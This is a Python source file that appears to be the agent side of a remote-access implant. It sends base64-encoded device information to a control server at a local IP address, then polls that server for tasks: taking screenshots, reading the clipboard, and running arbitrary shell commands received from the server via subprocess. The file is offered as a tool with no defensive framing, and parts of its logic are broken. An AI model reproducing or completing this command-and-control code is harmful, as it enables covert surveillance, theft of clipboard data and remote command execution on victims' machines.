#!/usr/local/bin/python3

import requests
import threading
import json
import base64

from Providers.DeviceInfoProvider import DeviceInfoProvider

"""
    TODO:
    -----
    1. Finish initial basic tasks in agent side
    2. Finish task management on server side
    3. Test with randomly tasks to see if it works
"""

class TaskManagmentHandler():
    # Handle tasks from server

    NUMBER_OF_SECOND_IN_MINUTES = 60

    MINUTES_TO_FIRST_TASK = 1 * NUMBER_OF_SECOND_IN_MINUTES
    MINUTES_TO_NORMAL_TASK = 1 * NUMBER_OF_SECOND_IN_MINUTES
    MINUTES_TO_FAILED_TASK = 1 * NUMBER_OF_SECOND_IN_MINUTES

    currentAwaitingTime = MINUTES_TO_FIRST_TASK

    def startTask(self):
        print("[l] startTask")
        workerThread = threading.Timer(self.MINUTES_TO_FIRST_TASK, self.executeTaskFromServer(True, self.MINUTES_TO_NORMAL_TASK))
        workerThread.daemon = False
        workerThread.start()

    def executeTaskFromServer(self, isFirstTime = False, awaitingTime = MINUTES_TO_NORMAL_TASK):
        try:
            print("[l] executeTaskFromServer")

            if isFirstTime:
                # Send to server device info & screenshot

                devInfoProvider = DeviceInfoProvider()
                devInfoDict = devInfoProvider.getDeviceInfo()

                strJson = json.dumps(devInfoDict, ensure_ascii=False)
                strJson = base64.encodebytes(strJson.encode())
                strJson = strJson.decode("UTF-8").replace("\n", "")

                url = "http://192.168.0.102/control.php?task=deviceInfo&data={0}".format(strJson)

                response = requests.post(url)
                print("[l] response.text: {0}".format(response.text))
            else:
                response = requests.get("http://192.168.0.102/control.php?task=getTask")
                taskResponse = response.text
                print("taskResponse: {0}".format(taskResponse))

                if taskResponse["task"]:
                    if len(taskResponse["task"]) > 0:
                        self.currentAwaitingTime = self.MINUTES_TO_NORMAL_TASK

                        if taskResponse["task"] is "deviceInfo":
                            # Get device info
                            devInfoProvider = DeviceInfoProvider()
                            deviceInfoDict = devInfoProvider.getDeviceInfo()
                        elif taskResponse["task"] is "screenshot":
                            # Take screenshot
                            from Providers import ScreenshotProvider

                            scProvider = ScreenshotProvider
                            base64Image = scProvider.getBase64Screenshot()
                        elif taskResponse["task"] is "clipboard":
                            # Get clipboard data
                            devInfoProvider = DeviceInfoProvider()
                            clipboardData = devInfoProvider.getClipboardData()
                        elif taskResponse["task"] is "terminal":
                            import subprocess

                            if taskResponse["data"]:
                                if len(taskResponse["data"]) > 0:
                                    command = taskResponse["data"]
                                    terminalOutput = subprocess.check_output(command).decode("UTF-8")

                    print("[l] schedule next task thread")
                    workerThread = threading.Timer(awaitingTime,
                                                   self.executeTaskFromServer(False, self.MINUTES_TO_NORMAL_TASK))
                    workerThread.daemon = False
                    workerThread.start()
                else:
                    print("[l] schedule failed task thread")
                    workerThread = threading.Timer(awaitingTime,
                                                   self.executeTaskFromServer(False, self.MINUTES_TO_FAILED_TASK))
                    workerThread.daemon = False
                    workerThread.start()
        except:
            print("[l] schedule failed task thread")
            workerThread = threading.Timer(awaitingTime, self.executeTaskFromServer(False, self.MINUTES_TO_FAILED_TASK))
            workerThread.daemon = False
            workerThread.start()


if __name__ == "__main__":
    taskMgr = TaskManagmentHandler()
    taskMgr.startTask()